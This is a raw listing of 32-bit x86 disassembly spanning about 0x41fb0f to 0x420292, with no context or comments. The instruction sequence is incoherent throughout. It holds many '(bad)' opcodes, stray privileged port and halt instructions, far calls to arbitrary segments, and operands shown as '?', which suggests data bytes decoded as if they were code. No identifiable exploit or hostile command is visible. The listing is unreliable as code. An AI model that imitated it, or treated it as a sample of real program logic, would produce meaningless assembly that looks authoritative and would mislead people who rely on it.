  41fb0f:	scas   eax,DWORD PTR es:[edi]
  41fb10:	imul   edx,DWORD PTR [eax+eax*1-0x168f0714],0x5a11fb4d
  41fb1b:	jbe    0x41fb15
  41fb1d:	and    cl,BYTE PTR [eax+0x79944d44]
  41fb23:	cwde   
  41fb24:	lods   eax,DWORD PTR ds:[esi]
  41fb25:	cmp    BYTE PTR [esp+eax*4],dl
  41fb28:	and    eax,edx
  41fb2a:	in     eax,0xb1
  41fb2c:	jecxz  0x41faf4
  41fb2e:	mov    edx,0x641866e8
  41fb33:	sub    al,0xec
  41fb35:	fstp   st(2)
  41fb37:	rol    BYTE PTR [ecx],1
  41fb39:	push   esi
  41fb3a:	bound  ecx,QWORD PTR [ecx+0x54]
  41fb3d:	cmp    DWORD PTR [ecx],ebx
  41fb3f:	loope  0x41fba3
  41fb41:	xor    dl,BYTE PTR [eax]
  41fb43:	(bad)  
  41fb44:	pushf  
  41fb45:	sub    edx,ecx
  41fb47:	inc    edi
  41fb48:	(bad)  
  41fb49:	mov    ah,0x1a
  41fb4b:	and    ecx,eax
  41fb4d:	jmp    0x41fb54
  41fb4f:	sbb    al,dh
  41fb51:	nop
  41fb52:	pop    ss
  41fb53:	mov    ah,ah
  41fb55:	jge    0x41fb43
  41fb57:	jbe    0x41fae0
  41fb59:	cmc    
  41fb5a:	inc    DWORD PTR [ebx-0x66]
  41fb5d:	mov    bh,0x38
  41fb5f:	add    DWORD PTR [edi-0x5],ecx
  41fb62:	xchg   edi,eax
  41fb63:	loope  0x41fb92
  41fb65:	pop    esi
  41fb66:	stc    
  41fb67:	jbe    0x41fb10
  41fb69:	xchg   ebp,eax
  41fb6a:	cmp    eax,DWORD PTR es:0x8bbaecd8
  41fb71:	xlat   BYTE PTR ds:[ebx]
  41fb72:	ins    DWORD PTR es:[edi],dx
  41fb73:	mov    eax,es:0x2e65b2d2
  41fb79:	dec    ecx
  41fb7a:	push   0xa1ae868e
  41fb7f:	loope  0x41fb23
  41fb81:	mov    ebp,0xfedff836
  41fb86:	mov    esp,?
  41fb88:	lods   eax,DWORD PTR ds:[esi]
  41fb89:	repnz push cs
  41fb8b:	xor    al,0xaa
  41fb8d:	mov    ecx,0x23380a56
  41fb92:	ds dec eax
  41fb94:	test   al,0x76
  41fb96:	push   edi
  41fb97:	imul   esi,esp,0xd3db8633
  41fb9d:	ror    edi,1
  41fb9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fba0:	sub    eax,0x19406602
  41fba5:	or     BYTE PTR [ecx+edi*1+0x1a],cl
  41fba9:	sar    DWORD PTR [edx+0x4cd6c6ba],1
  41fbaf:	adc    al,0xa5
  41fbb1:	repz hlt 
  41fbb3:	data16 out dx,al
  41fbb5:	test   DWORD PTR [edx-0x1e],0xad937980
  41fbbc:	push   es
  41fbbd:	dec    esp
  41fbbe:	or     cl,cl
  41fbc0:	mov    cl,0x61
  41fbc2:	xor    al,0xc0
  41fbc4:	data16 jl 0x41fbb4
  41fbc7:	xor    dl,BYTE PTR [edi]
  41fbc9:	mov    esi,0x6e93130e
  41fbce:	mov    al,0x8e
  41fbd0:	jns    0x41fbac
  41fbd2:	enter  0x69af,0x89
  41fbd6:	or     eax,0xbef3bcd5
  41fbdb:	call   0x9afd:0x1b82be1d
  41fbe2:	outs   dx,DWORD PTR ds:[esi]
  41fbe3:	cmp    eax,0x506b8300
  41fbe8:	add    DWORD PTR [ebx],edx
  41fbea:	push   ecx
  41fbeb:	sahf   
  41fbec:	pop    edx
  41fbed:	js     0x41fbd5
  41fbef:	adc    eax,DWORD PTR [ebx]
  41fbf1:	or     ebp,edx
  41fbf3:	push   ebp
  41fbf4:	xor    eax,0x63ecf2ae
  41fbf9:	pusha  
  41fbfa:	jg     0x41fbde
  41fbfc:	cli    
  41fbfd:	jo     0x41fc68
  41fbff:	pushf  
  41fc00:	xor    al,0xdb
  41fc02:	loopne 0x41fb89
  41fc04:	sti    
  41fc05:	imul   edx,ecx,0x79
  41fc08:	mov    bh,0xc2
  41fc0a:	mov    WORD PTR [esp+esi*4+0x7b],ds
  41fc0e:	add    ebx,edi
  41fc10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc11:	push   ds
  41fc12:	pusha  
  41fc13:	retf   0xd87c
  41fc16:	mov    edx,0x4b277c3c
  41fc1b:	mov    bh,0xdd
  41fc1d:	xor    edx,DWORD PTR [ecx+0x6d7ed03]
  41fc23:	loop   0x41fbc0
  41fc25:	stos   BYTE PTR es:[edi],al
  41fc26:	sti    
  41fc27:	dec    ebx
  41fc28:	mov    WORD PTR [ebp-0x61d67946],ss
  41fc2e:	sbb    BYTE PTR [ebp-0x1b7b42d],dl
  41fc34:	push   0x2f
  41fc36:	popa   
  41fc37:	ins    DWORD PTR es:[edi],dx
  41fc38:	je     0x41fc17
  41fc3a:	aam    0x55
  41fc3c:	jne    0x41fc47
  41fc3e:	sub    eax,0x9cc87fd5
  41fc43:	mov    BYTE PTR [edx+ebp*4],bl
  41fc46:	push   esi
  41fc47:	mov    edi,0x60a448b9
  41fc4c:	fsub   st(4),st
  41fc4e:	xchg   esi,eax
  41fc4f:	jae    0x41fbfc
  41fc51:	(bad)  
  41fc52:	out    0x31,eax
  41fc54:	inc    esi
  41fc55:	dec    edi
  41fc56:	fnsave [esi+0x77]
  41fc59:	pop    es
  41fc5a:	and    edx,ebp
  41fc5c:	pop    ds
  41fc5d:	repz das 
  41fc5f:	mov    al,ds:0x7c92218f
  41fc64:	xor    DWORD PTR [edi+0x191ae671],eax
  41fc6a:	xor    bh,BYTE PTR cs:[esi]
  41fc6d:	scas   eax,DWORD PTR es:[edi]
  41fc6e:	push   ebp
  41fc6f:	mov    esp,DWORD PTR [eax+ebp*1+0x9]
  41fc73:	adc    ah,BYTE PTR [esi]
  41fc75:	adc    DWORD PTR [ebx+0x37],edx
  41fc78:	mov    dh,BYTE PTR [eax+0x52]
  41fc7b:	cwde   
  41fc7c:	in     al,0xf7
  41fc7e:	jecxz  0x41fc1b
  41fc80:	gs enter 0x58db,0x79
  41fc85:	test   BYTE PTR [esi-0x1d],ch
  41fc88:	ja     0x41fc2c
  41fc8a:	jbe    0x41fc84
  41fc8c:	shr    ebp,0xb8
  41fc8f:	(bad)  
  41fc90:	pop    edi
  41fc91:	icebp  
  41fc92:	not    ah
  41fc94:	adc    bl,dh
  41fc96:	xchg   ebx,eax
  41fc97:	xchg   ecx,eax
  41fc98:	mov    ds:0x6becc2ec,al
  41fc9d:	inc    esi
  41fc9e:	jecxz  0x41fc89
  41fca0:	fs xchg ecx,eax
  41fca2:	fist   DWORD PTR [edi]
  41fca4:	int3   
  41fca5:	pop    ds
  41fca6:	addr16 mov al,0x2a
  41fca9:	add    al,0xc4
  41fcab:	sub    DWORD PTR [eax-0x3e8f6f41],edi
  41fcb1:	leave  
  41fcb2:	rep outs dx,BYTE PTR ds:[esi]
  41fcb4:	dec    esi
  41fcb5:	mov    ebp,0x752f7dd5
  41fcba:	aad    0x6e
  41fcbc:	rol    DWORD PTR ds:0xa268246b,0xd1
  41fcc3:	imul   edi,DWORD PTR [ebx+0x14],0x62433875
  41fcca:	mov    ds:0xec8f828e,al
  41fccf:	dec    edx
  41fcd0:	stos   DWORD PTR es:[edi],eax
  41fcd1:	sti    
  41fcd2:	and    eax,0xcea847a3
  41fcd7:	fninit 
  41fcd9:	add    DWORD PTR [esi],edi
  41fcdb:	cmp    eax,DWORD PTR [esi]
  41fcdd:	push   ebp
  41fcde:	mov    dh,0xb5
  41fce0:	add    al,dl
  41fce2:	je     0x41fc96
  41fce4:	and    eax,0xa6b137c1
  41fce9:	jns    0x41fce4
  41fceb:	sub    ch,BYTE PTR [ebx-0x15]
  41fcee:	xchg   ebx,eax
  41fcef:	outs   dx,BYTE PTR ds:[esi]
  41fcf0:	or     eax,0x53162593
  41fcf5:	sub    BYTE PTR [ebp-0x314e38cc],ah
  41fcfb:	mov    eax,ds:0x89f8e7fa
  41fd00:	loop   0x41fd54
  41fd02:	icebp  
  41fd03:	fild   DWORD PTR [eax+eax*8+0x6b]
  41fd07:	(bad)  
  41fd09:	dec    edx
  41fd0a:	fwait
  41fd0b:	mov    ebx,DWORD PTR [eax+0x1917e5d2]
  41fd11:	mov    edi,0xb231b2d0
  41fd16:	loopne 0x41fce9
  41fd18:	mov    al,ds:0xc6ba2322
  41fd1d:	xchg   BYTE PTR [ecx],cl
  41fd1f:	addr16 aad 0xf7
  41fd22:	mov    esi,eax
  41fd24:	retf   0x3246
  41fd27:	lea    ebx,[edx+0x44]
  41fd2a:	push   ecx
  41fd2b:	cmc    
  41fd2c:	es add al,0xa3
  41fd2f:	ret    
  41fd30:	ins    BYTE PTR es:[edi],dx
  41fd31:	xchg   edx,eax
  41fd32:	mov    ecx,0x35e10c15
  41fd37:	and    BYTE PTR [edi-0x5512fd68],bh
  41fd3d:	pop    ds
  41fd3e:	xor    DWORD PTR [ecx-0x5801c89a],esi
  41fd44:	push   ds
  41fd45:	bound  edi,QWORD PTR ds:0x2424b188
  41fd4b:	sub    eax,0xc6ace424
  41fd50:	cwde   
  41fd51:	jnp    0x41fda0
  41fd53:	mov    al,0x6e
  41fd55:	test   BYTE PTR [ecx+0x515ba698],0xe7
  41fd5c:	int3   
  41fd5d:	daa    
  41fd5e:	call   0x9887:0x23d16f28
  41fd65:	xchg   esi,eax
  41fd66:	dec    eax
  41fd67:	add    esi,esp
  41fd69:	in     eax,0x75
  41fd6b:	jmp    0x11d:0xdcec567f
  41fd72:	adc    ch,bh
  41fd74:	jnp    0x41fd19
  41fd76:	pop    ss
  41fd77:	xchg   bl,dl
  41fd79:	rcr    BYTE PTR [esi+0x78],cl
  41fd7c:	out    dx,eax
  41fd7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd7e:	loop   0x41fd5e
  41fd80:	into   
  41fd81:	hlt    
  41fd82:	push   es
  41fd83:	dec    ebp
  41fd84:	nop
  41fd85:	pop    edi
  41fd86:	xchg   ebx,eax
  41fd87:	clc    
  41fd88:	repz push esi
  41fd8a:	mov    ah,0xc7
  41fd8c:	add    BYTE PTR es:[ebp+0x9],bl
  41fd90:	es pop ecx
  41fd92:	sub    BYTE PTR [ebx-0x23],bl
  41fd95:	out    0x57,eax
  41fd97:	xchg   BYTE PTR [esi-0x49],cl
  41fd9a:	popf   
  41fd9b:	xchg   esi,eax
  41fd9c:	pop    esp
  41fd9d:	and    eax,0xb34d8288
  41fda2:	retf   
  41fda3:	sub    DWORD PTR [ecx],0xffffffb5
  41fda6:	jbe    0x41fd4c
  41fda8:	clc    
  41fda9:	popa   
  41fdaa:	in     eax,dx
  41fdab:	fnstcw WORD PTR [ebx+0x4ae0494c]
  41fdb1:	adc    ch,BYTE PTR [esi+eax*1+0x37]
  41fdb5:	stos   DWORD PTR es:[edi],eax
  41fdb6:	cdq    
  41fdb7:	sub    al,0x33
  41fdb9:	stos   BYTE PTR es:[edi],al
  41fdba:	push   ss
  41fdbb:	das    
  41fdbc:	add    eax,0x5133958c
  41fdc1:	fisub  WORD PTR [ecx+ecx*2+0x6ae0f961]
  41fdc8:	arpl   WORD PTR ds:0xa73e7a76,bp
  41fdce:	in     eax,0x38
  41fdd0:	xchg   ebp,eax
  41fdd1:	cmp    eax,0x331fa61d
  41fdd6:	push   ds
  41fdd7:	sbb    edi,DWORD PTR [ecx]
  41fdd9:	call   0x25fd:0xdfd46fbf
  41fde0:	push   cs
  41fde1:	xor    eax,0x35c046f8
  41fde6:	jp     0x41fd81
  41fde8:	jb     0x41fe3b
  41fdea:	push   esi
  41fdeb:	aas    
  41fdec:	pop    ds
  41fded:	hlt    
  41fdee:	retf   0xc079
  41fdf1:	dec    ebx
  41fdf2:	aaa    
  41fdf3:	fist   WORD PTR [ebx-0x2e]
  41fdf6:	xchg   esp,eax
  41fdf7:	nop
  41fdf8:	repz jne 0x41fe00
  41fdfb:	(bad)  
  41fdfc:	adc    cl,bh
  41fdfe:	jge    0x41fdd3
  41fe00:	cmp    bl,BYTE PTR [edx+0x50]
  41fe03:	mov    BYTE PTR [ecx-0x4d8fd0d2],bh
  41fe09:	out    0xbd,al
  41fe0b:	mov    esi,0x681183ff
  41fe10:	loop   0x41fe4b
  41fe12:	pop    eax
  41fe13:	inc    edx
  41fe14:	fmul   DWORD PTR [esi]
  41fe16:	pop    es
  41fe17:	gs jmp 0x97f6ba59
  41fe1d:	test   BYTE PTR [ecx+eax*2-0x22],0x27
  41fe22:	push   ebp
  41fe23:	mov    ebx,0xe173d245
  41fe28:	dec    edi
  41fe29:	jle    0x41fe3a
  41fe2b:	pop    eax
  41fe2c:	pop    edi
  41fe2d:	mov    edx,0x547b90ac
  41fe32:	adc    ch,BYTE PTR [ebp-0x1b162728]
  41fe38:	stos   DWORD PTR es:[edi],eax
  41fe39:	jp     0x41fdf2
  41fe3b:	and    eax,0x39b1c499
  41fe40:	loope  0x41fdd8
  41fe42:	add    eax,DWORD PTR [eax-0x2bfaced3]
  41fe48:	xor    BYTE PTR [esi],cl
  41fe4a:	gs inc ecx
  41fe4c:	fild   QWORD PTR [ebx-0x46c7f5fa]
  41fe52:	xor    BYTE PTR [ecx-0x35],ch
  41fe55:	stos   DWORD PTR es:[edi],eax
  41fe56:	cli    
  41fe57:	gs jns 0x41fe78
  41fe5a:	cli    
  41fe5b:	out    0xd9,eax
  41fe5d:	leave  
  41fe5e:	mov    al,ds:0xe72461d1
  41fe63:	std    
  41fe64:	lods   al,BYTE PTR ds:[esi]
  41fe65:	in     eax,0xc7
  41fe67:	mov    edx,0xae93c941
  41fe6c:	(bad)  
  41fe6d:	mov    cl,0xa1
  41fe6f:	pusha  
  41fe70:	ret    0x7e25
  41fe73:	xlat   BYTE PTR ds:[ebx]
  41fe74:	loope  0x41feba
  41fe76:	or     BYTE PTR ds:0x12205e4a,dh
  41fe7c:	aaa    
  41fe7d:	ss mov dh,0xc6
  41fe80:	sbb    al,0x4b
  41fe82:	push   eax
  41fe83:	iret   
  41fe84:	rol    DWORD PTR ds:0x492a9def,1
  41fe8a:	scas   al,BYTE PTR es:[edi]
  41fe8b:	jne    0x41fecd
  41fe8d:	xchg   ebp,eax
  41fe8e:	mov    ebx,0x62c87e1c
  41fe93:	jl     0x41ff0f
  41fe95:	pop    ss
  41fe96:	sbb    ebp,esp
  41fe98:	scas   eax,DWORD PTR es:[edi]
  41fe99:	hlt    
  41fe9a:	test   DWORD PTR [esi],edx
  41fe9c:	(bad)  
  41fe9d:	retf   0x2a0d
  41fea0:	paddb  mm4,QWORD PTR [eax+0x7d36f248]
  41fea7:	push   ds
  41fea8:	and    BYTE PTR [ebp+0x1c],cl
  41feab:	ja     0x41fe3c
  41fead:	int    0xac
  41feaf:	add    eax,DWORD PTR ds:0x79563f5b
  41feb5:	xchg   DWORD PTR [eax],edx
  41feb7:	sub    dh,dh
  41feb9:	dec    ebp
  41feba:	and    BYTE PTR [edi+0x5e],ch
  41febd:	clc    
  41febe:	mov    ds:0x1678c728,eax
  41fec3:	add    BYTE PTR [ebx+eax*4-0x7a06a78b],al
  41feca:	or     bh,BYTE PTR [eax-0x7f9d344f]
  41fed0:	ret    0x97e3
  41fed3:	sbb    al,0x31
  41fed5:	into   
  41fed6:	inc    esi
  41fed7:	jmp    0x44e0dbb7
  41fedc:	pop    edi
  41fedd:	loopne 0x41ff26
  41fedf:	xor    eax,0xafb282f1
  41fee4:	pop    esp
  41fee5:	icebp  
  41fee6:	push   edx
  41fee7:	loope  0x41ff61
  41fee9:	mov    edi,0x1895e573
  41feee:	xchg   BYTE PTR [ecx-0x46e50d29],dh
  41fef4:	add    BYTE PTR [edi+eiz*4-0x47aa48f5],cl
  41fefb:	out    dx,al
  41fefc:	jb     0x41ff07
  41fefe:	jno    0x41ff1b
  41ff00:	mov    WORD PTR [ebx],ds
  41ff02:	jge    0x41fec7
  41ff04:	pop    esp
  41ff05:	xor    BYTE PTR [esp+edi*2+0x1e],ch
  41ff09:	add    al,0x0
  41ff0c:	fist   DWORD PTR [ebp-0x2]
  41ff0f:	lock pop edx
  41ff11:	xchg   esi,eax
  41ff12:	jge    0x41feda
  41ff14:	ja     0x41ff01
  41ff16:	sbb    BYTE PTR [esp+edi*1+0x2b054191],dh
  41ff1d:	and    DWORD PTR ss:[ebx+ebx*2+0x62],eax
  41ff22:	sub    eax,0x820d1bfc
  41ff27:	add    edi,DWORD PTR [ebx-0x39]
  41ff2a:	lea    esi,[edx-0x647257c9]
  41ff30:	retf   0xba06
  41ff33:	cmp    esi,DWORD PTR [eax+0xf6d65bf]
  41ff39:	xor    BYTE PTR [ebx-0x2711da25],dh
  41ff3f:	lea    ecx,[esi-0x36164ae6]
  41ff45:	xchg   ebx,eax
  41ff46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff47:	dec    esp
  41ff48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff49:	(bad)  
  41ff4a:	mov    BYTE PTR [edi-0x583321a0],dh
  41ff50:	data16 lock ror dl,1
  41ff54:	or     BYTE PTR [edx+0x11],al
  41ff57:	add    DWORD PTR [eax+edx*1],esp
  41ff5a:	lea    edx,[esi]
  41ff5c:	dec    esi
  41ff5d:	and    eax,0x22404e04
  41ff62:	ror    DWORD PTR [ebx+eax*1],cl
  41ff65:	adc    al,0x94
  41ff67:	popf   
  41ff68:	push   eax
  41ff69:	sub    ecx,DWORD PTR [ebx+0x286b589c]
  41ff6f:	in     al,dx
  41ff70:	fs push es
  41ff72:	xchg   ebp,eax
  41ff73:	or     DWORD PTR [ecx-0x68],0x9
  41ff77:	in     al,0x7e
  41ff79:	jne    0x41ff44
  41ff7b:	or     edi,esp
  41ff7d:	ss dec esi
  41ff7f:	daa    
  41ff80:	sub    BYTE PTR [eax],ch
  41ff82:	xor    eax,0xfaa5330
  41ff87:	shr    bl,0xfa
  41ff8a:	stos   BYTE PTR es:[edi],al
  41ff8b:	out    0x2,al
  41ff8d:	in     eax,dx
  41ff8e:	gs inc esi
  41ff90:	or     al,0xa3
  41ff92:	dec    ebp
  41ff93:	xchg   esi,eax
  41ff94:	inc    edi
  41ff95:	mov    ds:0xac3bcdca,eax
  41ff9a:	sbb    esp,DWORD PTR [ebx+0x7f]
  41ff9d:	stos   BYTE PTR es:[edi],al
  41ff9e:	daa    
  41ff9f:	push   esp
  41ffa0:	lock xchg edx,eax
  41ffa2:	bound  esp,QWORD PTR [esi+0x2b9b6600]
  41ffa8:	inc    edi
  41ffa9:	popa   
  41ffaa:	scas   al,BYTE PTR es:[edi]
  41ffab:	stos   DWORD PTR es:[edi],eax
  41ffac:	cwde   
  41ffad:	jmp    0xe198:0x7c6c57cc
  41ffb4:	push   ebp
  41ffb5:	(bad)  
  41ffb6:	jge    0x41ffdb
  41ffb8:	push   edx
  41ffb9:	out    0x18,al
  41ffbb:	add    edi,ebx
  41ffbd:	pop    edi
  41ffbe:	mov    esp,ecx
  41ffc0:	mov    ecx,?
  41ffc2:	ret    
  41ffc3:	or     DWORD PTR [ebx+0x1559f347],ebx
  41ffc9:	push   ss
  41ffca:	test   DWORD PTR ds:0xdec158d6,ebx
  41ffd0:	push   eax
  41ffd1:	sti    
  41ffd2:	xchg   BYTE PTR [edi],dl
  41ffd4:	out    dx,eax
  41ffd5:	push   ebx
  41ffd6:	pop    ebx
  41ffd7:	pop    esi
  41ffd8:	add    DWORD PTR ds:0x45001cbd,0x426fb99c
  41ffe2:	test   al,0xa7
  41ffe4:	mov    ds:0x25350550,eax
  41ffe9:	or     ebp,eax
  41ffeb:	sbb    al,0xcd
  41ffed:	mov    fs,WORD PTR [ecx-0x48]
  41fff0:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41fff2:	mov    eax,0xd06221d8
  41fff7:	xchg   ebp,eax
  41fff8:	sti    
  41fff9:	shl    DWORD PTR [edx-0x43caa61d],0x92
  420000:	dec    ebx
  420001:	scas   eax,DWORD PTR es:[edi]
  420002:	and    DWORD PTR [eax],esi
  420004:	cmc    
  420005:	xlat   BYTE PTR ds:[ebx]
  420006:	dec    esp
  420007:	test   bh,bl
  420009:	sbb    eax,0xb88b88cf
  42000e:	es sahf 
  420010:	cmp    eax,0xc954d679
  420015:	fsqrt  
  420017:	mov    edi,0x256a8521
  42001c:	imul   edx,edi,0x2c084e6d
  420022:	lock xchg esp,eax
  420024:	aad    0x3b
  420026:	ja     0x42006d
  420028:	ficom  WORD PTR [eax]
  42002a:	add    edx,ecx
  42002c:	jae    0x420066
  42002e:	push   ds
  42002f:	shr    DWORD PTR [ebx+0x5b],cl
  420032:	sub    ebp,esi
  420034:	loopne 0x420088
  420036:	lods   eax,DWORD PTR ds:[esi]
  420037:	jl     0x420069
  420039:	mov    ch,0xe4
  42003b:	pop    ebp
  42003c:	scas   al,BYTE PTR es:[edi]
  42003d:	int    0x2d
  42003f:	aaa    
  420040:	sub    edx,DWORD PTR [edx]
  420042:	enter  0x4e0c,0xd6
  420046:	(bad)  
  420047:	adc    DWORD PTR [edi+ebx*2],eax
  42004a:	test   DWORD PTR [esi+0x1e],esi
  42004d:	lock (bad) 
  42004f:	mov    BYTE PTR [edi],dl
  420051:	test   DWORD PTR [edx+0x66],0xa0fe022d
  420058:	cdq    
  420059:	loop   0x4200c9
  42005b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42005c:	xor    dl,ah
  42005e:	xlat   BYTE PTR ds:[ebx]
  42005f:	fwait
  420060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420061:	jecxz  0x41ffee
  420063:	fild   DWORD PTR [edx]
  420065:	sar    DWORD PTR [edx],0xbf
  420068:	shl    DWORD PTR [edx-0x26],0xe
  42006c:	das    
  42006d:	aaa    
  42006e:	jae    0x42007b
  420070:	mov    edi,0x72dd514d
  420075:	lds    esi,FWORD PTR ds:0xfa024c33
  42007b:	inc    edx
  42007c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42007d:	imul   edx,eax,0xf6c29f42
  420083:	cmp    eax,0x90abcb48
  420088:	fadd   QWORD PTR [eax-0x75]
  42008b:	sub    bh,BYTE PTR [esi]
  42008d:	mov    edi,0xe9c70ff2
  420092:	xchg   ebx,eax
  420093:	js     0x4200c9
  420095:	fdivr  st(1),st
  420097:	pusha  
  420098:	test   DWORD PTR [edx],esp
  42009a:	pop    es
  42009b:	xor    al,0x26
  42009d:	outs   dx,DWORD PTR ds:[esi]
  42009e:	inc    eax
  42009f:	aaa    
  4200a0:	dec    esi
  4200a1:	and    DWORD PTR [esi+0x73],ebp
  4200a4:	in     al,dx
  4200a5:	mov    DWORD PTR [ebx],ebp
  4200a7:	call   0xd246:0x43a045de
  4200ae:	jne    0x420119
  4200b0:	sbb    dh,BYTE PTR [esi-0x43c00440]
  4200b6:	jp     0x420077
  4200b8:	hlt    
  4200b9:	ja     0x4200ef
  4200bb:	dec    dh
  4200bd:	popa   
  4200be:	js     0x4200f9
  4200c0:	addr16 adc eax,0xd2d87437
  4200c6:	xchg   edi,eax
  4200c7:	cs push ecx
  4200c9:	xchg   edx,eax
  4200ca:	dec    esi
  4200cb:	push   ss
  4200cc:	enter  0xcc9d,0x36
  4200d0:	or     BYTE PTR [ebp+0x657487d8],bl
  4200d6:	shl    BYTE PTR [edi-0x30],1
  4200d9:	lahf   
  4200da:	fs cwde 
  4200dc:	lahf   
  4200dd:	pusha  
  4200de:	xlat   BYTE PTR ds:[ebx]
  4200df:	test   eax,0x70eb1f68
  4200e4:	sbb    BYTE PTR [eax+0x3e],dh
  4200e7:	inc    esi
  4200e8:	or     ebx,esp
  4200ea:	lods   al,BYTE PTR ds:[esi]
  4200eb:	add    edx,0xffffff97
  4200ee:	sbb    al,0xd
  4200f0:	jl     0x420114
  4200f2:	jno    0x4200be
  4200f4:	push   esp
  4200f5:	dec    eax
  4200f6:	or     bl,al
  4200f8:	(bad)  
  4200f9:	nop
  4200fa:	inc    edi
  4200fb:	jle    0x420154
  4200fd:	xlat   BYTE PTR ds:[ebx]
  4200fe:	shl    bl,cl
  420100:	jp     0x42010d
  420102:	pop    ebp
  420103:	mov    ss,WORD PTR [edx-0x633fbd7a]
  420109:	and    al,0xe0
  42010b:	push   esp
  42010c:	in     eax,0x56
  42010e:	loope  0x4200c5
  420110:	daa    
  420111:	call   ebx
  420113:	xchg   BYTE PTR [edi],cl
  420115:	es and eax,0xe9f11af2
  42011b:	lea    edx,[ecx-0x20]
  42011e:	xchg   esp,eax
  42011f:	iret   
  420120:	or     BYTE PTR [edi+0x6],dl
  420123:	pop    ebp
  420124:	repz int3 
  420126:	xchg   ecx,eax
  420127:	(bad)  
  420129:	test   DWORD PTR [esi],eax
  42012b:	jmp    0x420194
  42012d:	inc    edx
  42012e:	sub    BYTE PTR [ebp-0x16cb4412],ch
  420134:	push   edx
  420135:	out    dx,eax
  420136:	cli    
  420137:	mov    dl,0x49
  420139:	adc    dh,cl
  42013b:	gs lock mov ecx,0xdb970416
  420142:	cmp    BYTE PTR [ecx-0x51e1d2d5],ah
  420148:	xchg   edi,eax
  420149:	cmp    ebp,esp
  42014b:	retf   
  42014c:	lea    edx,[ecx+0x43]
  42014f:	ss (bad) 
  420151:	mov    eax,ds:0xe0d75771
  420156:	and    dl,BYTE PTR [ebx]
  420158:	test   esp,edi
  42015a:	adc    BYTE PTR [ecx-0x28],0x36
  42015e:	lds    esi,FWORD PTR ds:[edi+0x9]
  420162:	idiv   BYTE PTR [ebp+0x27]
  420165:	hlt    
  420166:	sub    dl,BYTE PTR [edi+0xf71b26f]
  42016c:	dec    esp
  42016d:	mov    al,0x37
  42016f:	xchg   edx,eax
  420170:	and    eax,0x9d7639a3
  420175:	inc    esi
  420176:	shl    ch,0x20
  420179:	stos   DWORD PTR es:[edi],eax
  42017a:	(bad)  
  42017c:	sbb    eax,0x803a6e39
  420181:	lea    ebp,[esi+ebp*8+0x7b]
  420185:	inc    ecx
  420186:	jge    0x42012e
  420188:	mov    dl,0xc4
  42018a:	jne    0x4201b5
  42018c:	cmc    
  42018d:	dec    esp
  42018e:	js     0x420124
  420190:	imul   ebx,DWORD PTR [esi+0x4f],0x7a
  420194:	jg     0x420117
  420196:	or     al,0xc7
  420198:	pushf  
  420199:	shl    ch,1
  42019b:	ds inc esi
  42019d:	(bad)  
  42019e:	xor    DWORD PTR [ecx],eax
  4201a0:	adc    al,0xbe
  4201a2:	dec    eax
  4201a3:	cmc    
  4201a4:	sbb    al,dl
  4201a6:	imul   ebx,DWORD PTR [edi+0x25],0xd39a5c7f
  4201ad:	dec    esi
  4201ae:	dec    edx
  4201af:	cdq    
  4201b0:	test   BYTE PTR [edi-0x35],ch
  4201b3:	jecxz  0x4201ae
  4201b5:	and    al,0x65
  4201b7:	std    
  4201b8:	or     BYTE PTR gs:[eax-0x5abda850],ah
  4201bf:	add    BYTE PTR [edx+ebp*8+0x6a],dl
  4201c3:	push   DWORD PTR [eax+ebp*2]
  4201c6:	lods   al,BYTE PTR ds:[esi]
  4201c7:	arpl   bp,ax
  4201c9:	or     al,BYTE PTR [eax-0x478eb03e]
  4201cf:	fadd   st,st(3)
  4201d1:	call   0x3ee8:0xd12b9525
  4201d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201d9:	jbe    0x420240
  4201db:	mov    ds:0xb81cc409,al
  4201e0:	rol    BYTE PTR [ebx+0x72],cl
  4201e3:	add    ecx,DWORD PTR ds:0x542ccf2c
  4201e9:	pop    esi
  4201ea:	and    eax,0x5f2c0024
  4201ef:	and    BYTE PTR [ebx-0x22db7e79],bl
  4201f5:	jecxz  0x420198
  4201f7:	out    0xfe,eax
  4201f9:	push   0x15a57ed8
  4201fe:	pop    ss
  4201ff:	test   eax,0x908c6b1d
  420204:	into   
  420205:	jecxz  0x420233
  420207:	out    0xa,eax
  420209:	out    0x63,eax
  42020b:	and    dl,BYTE PTR [eax+0x3edf09e7]
  420211:	arpl   ax,di
  420213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420214:	mov    ch,0x23
  420216:	and    DWORD PTR [ecx+0x77713e52],0xb75e21b
  420220:	fwait
  420221:	int    0xaa
  420223:	mov    ebx,0x7cc09c55
  420228:	fstp   TBYTE PTR [ebp+0x6a0c7f85]
  42022e:	jmp    0x42022b
  420230:	leave  
  420231:	mov    ds:0xe5d4ea0e,eax
  420236:	jbe    0x420220
  420238:	adc    edi,DWORD PTR [ebx+0x11]
  42023b:	imul   DWORD PTR [eax-0x58]
  42023e:	cmp    dl,BYTE PTR [eax+0x25]
  420241:	mov    ds:0xce9d7dc9,eax
  420246:	pop    edi
  420247:	and    eax,0xe7383f3a
  42024c:	and    al,BYTE PTR [ebx]
  42024e:	mov    al,ds:0x1d0e7c19
  420253:	push   ebx
  420254:	in     al,dx
  420255:	jmp    0x4202a7
  420257:	mov    ah,0x47
  420259:	mov    cl,0x67
  42025b:	jl     0x4202bb
  42025d:	sub    ecx,eax
  42025f:	retf   
  420260:	test   DWORD PTR [ecx+esi*4],esp
  420263:	loope  0x42025f
  420265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420266:	push   eax
  420267:	je     0x420276
  420269:	push   ss
  42026a:	mov    WORD PTR [esi+0x6e9343c2],cs
  420270:	mov    WORD PTR [edi-0x73],gs
  420273:	cmp    BYTE PTR [ebp-0x65d8be1],bl
  420279:	mov    DWORD PTR [eax+0x27],esp
  42027c:	ja     0x4202b0
  42027e:	call   0xeb472489
  420283:	enter  0x58e7,0x3e
  420287:	and    esp,DWORD PTR [edx+ebx*2]
  42028a:	fwait
  42028b:	sub    DWORD PTR [edx*1-0x53f6857e],esi
  420292:	sbb    DWORD PTR [ecx],edi
